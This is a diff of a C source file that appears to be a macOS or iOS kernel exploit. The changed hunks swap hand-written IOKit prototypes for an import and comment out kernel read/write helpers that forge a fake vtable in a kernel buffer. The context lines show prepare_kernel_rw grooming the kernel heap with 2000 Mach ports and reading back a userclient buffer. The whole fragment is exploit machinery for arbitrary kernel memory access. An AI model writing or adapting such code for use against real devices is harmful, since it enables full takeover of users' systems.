@@ -1,6 +1,6 @@
 
 
-
+#import <IOKit/IOKitLib.h>
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -20,10 +20,15 @@
 #include <CoreFoundation/CoreFoundation.h>
 
 
+
 // IOKit stuff
 
 #define kIOMasterPortDefault MACH_PORT_NULL
 #define IO_OBJECT_NULL MACH_PORT_NULL
+
+
+
+
 
 typedef mach_port_t io_iterator_t;
 typedef mach_port_t io_service_t;
@@ -32,48 +37,6 @@ typedef mach_port_t io_object_t;
 typedef    char io_name_t[128];
 
 
-CFMutableDictionaryRef
-IOServiceMatching(const char* name );
-
-kern_return_t
-IOServiceGetMatchingServices(
-                             mach_port_t masterPort,
-                             CFDictionaryRef matching,
-                             io_iterator_t * existing );
-
-io_service_t
-IOServiceGetMatchingService(
-                            mach_port_t    masterPort,
-                            CFDictionaryRef    matching);
-
-io_object_t
-IOIteratorNext(
-               io_iterator_t    iterator );
-
-kern_return_t
-IOObjectGetClass(
-                 io_object_t    object,
-                 io_name_t    className );
-
-kern_return_t
-IOServiceOpen(
-              io_service_t    service,
-              task_port_t    owningTask,
-              uint32_t    type,
-              io_connect_t  *    connect );
-
-kern_return_t
-IOServiceClose(
-               io_connect_t    connect );
-
-kern_return_t
-IOObjectRelease(
-                io_object_t    object );
-
-kern_return_t
-IOConnectGetService(
-                    io_connect_t    connect,
-                    io_service_t  *    service );
 
 // mach_vm protos
 
@@ -488,7 +451,7 @@ typedef struct _uint128_t {
     uint64_t lower;
     uint64_t upper;
 } uint128_t;
-
+/*
 uint128_t rk128(uint64_t address) {
     uint64_t r_obj[11];
     r_obj[0] = kernel_buffer_base+0x8;  // fake vtable points 8 bytes into this object
@@ -557,7 +520,7 @@ void wk64(uint64_t address, uint64_t value){
     uint128_t new = {value, old.upper};
     wk128(address, new);
 }
-
+*/
 uint64_t prepare_kernel_rw() {
     int nports=2000;
     int prealloc_size = 0x900; // kalloc.4096
@@ -618,7 +581,7 @@ uint64_t prepare_kernel_rw() {
     mach_port_deallocate(mach_task_self(), second_port);
     mach_port_destroy(mach_task_self(), second_port);
     
-    mach_port_t uc = alloc_userclient();
+    alloc_userclient();
     
     // read back the start of the userclient buffer:
     buf = receive_prealloc_msg(first_port);
